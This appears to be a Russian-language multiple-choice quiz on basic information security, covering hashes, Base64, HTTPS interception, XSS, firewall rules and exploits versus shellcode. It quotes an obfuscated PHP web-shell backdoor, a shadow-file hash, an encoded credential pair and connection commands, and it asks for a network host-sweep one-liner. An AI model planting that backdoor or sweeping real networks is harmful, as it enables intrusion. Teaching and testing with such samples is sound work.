## Базовые вопросы по информационной безопасности

<ol>
<li type="1">Что это и где это можно увидеть?
~~~
RnJlZDpwNDU1MTIzNA==
~~~
  <ul>
  <li type="a">Хеш MD5 из файла /etc/passwd
  <li type="a">Хеш MD5 из файла /etc/shadow
  <li type="a">Строка Base64 из HTTP-сессии
  <li type="a">Строка Base64 из HTTP cookie
  </ul>

<li type=1>Что это и где это можно увидеть?
~~~
$6$8BxedHgytw0E6oTe$khJsZIJUZmiPpFpbDaJBhJrEp1DFyUDDrhkvuIHzb6sPPKiHrjBdINZe3sSb/y0wOpY4NICyGd5tXHhX3E.Z70
~~~
  <ul>
  <li type="a">Хеш MD5 без соли из файла /etc/passwd
  <li type="a">Хеш MD5 с солью из файлв /etc/shadow
  <li type="a">Хеш SHA1 без соли из файла /etc/shadow
  <li type="a">Хеш SHA512 с солью из файла /etc/shadow
  </ul>

<li type=1>Назовите пять способов подсоединиться к TCP портам 80 или 443.
<ul>
<li type="a">ncat localhost:80; nc localhost 80; echo /dev/tcp/localhost/80; ncat --ssl localhost:443; openssl s_client localhost:443
<li type="a">ncat localhost 80; nc localhost 80; cat /dev/tcp/localhost/80; ncat --ssl localhost 443; openssl s_client localhost 443
<li type="a">ncat localhost 80; nc localhost 80; echo >/dev/tcp/localhost/80; ncat --ssl localhost 443; openssl s_client -connect localhost:443
<li type="a">ncat localhost:80; nc localhost:80; echo >>/dev/tcp/localhost/80; ncat --ssl localhost:443; openssl s_client localhost:443
</ul>

<li type=1>Какова принципиальная разница между симметричным и асимметричным шифрованием?
<ul>
<li type="a">Участники симметричного шифрования используют разделяемый ключ, участники асимметричного шифрования знают закрытые ключи друг друга.
<li type="a">Участники симметричного шифрования используют открытый ключ, участники асимметричного шифрования знают закрытые ключи друг друга.
<li type="a">Участники симметричного шифрования используют закрытый ключ, участники асимметричного шифрования знают открытые ключи друг друга.
<li type="a">Участники симметричного шифрования используют разделяемый ключ, участники асимметричного шифрования знают открытые ключи друг друга.
</ul>

<li type=1>Возможно ли перехватить, просмотреть или модифицировать HTTPS трафик?
<ul>
<li type="a">Возможно перехватить, но невозможно просмотреть или модифицировать.
<li type="a">Возможно перехватить и просмотреть, но невозможно модицифировать.
<li type="a">Возможно перехватить и модифицировать, но невозможно просмотреть.
<li type="a">Возможно перехватить, просмотреть и модифицировать.
</ul>

<li type=1>Что такое MITM атака?
<ul>
<li type="a">Атака, в которой клиент общается с фальшивым сервером.
<li type="a">Атака, в которой сервер общается с фальшивым клиентом.
<li type="a">Атака, в которой клиент и сервер общаются с фальшивыми копиями друг друга.
<li type="a">Все варианты правильные.
<li type="a">Правильные варианты a. и b.
</ul>

<li type=1>Каковы возможные последствия атаки Cross-Site Scripting?
<ul>
<li type="a">Удаленный доступ к серверу.
<li type="a">Удаленный доступ к клиенту.
<li type="a">Перехват серверной сессии.
<li type="a">Перехват клиентской сессии.
</ul>

<li type=1>Что здесь неправильно?
~~~ sql
select * from *;
~~~
<ul>
<li type="a">Вместо первой звездочки нужно подставить имя поля.
<li type="a">Вместо второй звездочки нужно подставить имя таблицы.
<li type="a">Оба варианта правильные.
<li type="a">Оба варианта неправильные.
</ul>

<li type=1>Что это такое?
~~~ php
<?$_="";$_[+""]='';$_="$_"."";$_=($_[+""]|"").($_[+""]|"").($_[+""]^"");?><?=${'_'.$_}['_'](${'_'.$_}['__']);?>
~~~
<ul>
<li type="a">Отладочная строка C++.
<li type="a">Программный код на Perl.
<li type="a">Бекдор на PHP.
<li type="a">Бекдор на LUA.
</ul>

<li type=1>Какова разница между эксплоитом и шеллкодом?
<ul>
<li type="a">Эксплоит используется для передачи жертве полезного груза, шеллкод осуществляет атаку на жертву.
<li type="a">Эксплоит используется для атаки на жертву, шеллкод использцется для передачи полезного груза.
<li type="a">Эксплоит используется для атаки на жертву, шеллкод составляет полезный груз.
<li type="a">Эксплоит составляет полезный груз, шеллкод используется для доставки полезного груза.
</ul>

<li type=1>Какой принцип должен быть реализован в завершение цепочки правил межсетевого экрана?
<ul>
<li type="a">Implicit Allow
<li type="a">Explicit Deny
<li type="a">Implicit Deny
<li type="a">Explicit Allow
</ul>

<li type=1>Какие принципы защищенной архитектуры вы знаете?

<li type=1>Напишите односточный скрипт на shell, выполнив которы в любой ОС GNU Linux можно получить список активных хостов в присоединенной сети класса C.
